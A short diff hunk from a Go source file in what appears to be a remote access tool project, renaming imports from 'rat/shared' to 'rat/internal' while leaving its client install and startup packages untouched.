@@ -7,8 +7,8 @@ import (
 	"os/exec"
 	"rat/client/install"
 	"rat/client/startup"
-	"rat/shared"
-	"rat/shared/installpath"
+	"rat/internal"
+	"rat/internal/installpath"
 	"time"
 
 	"github.com/xtaci/smux"
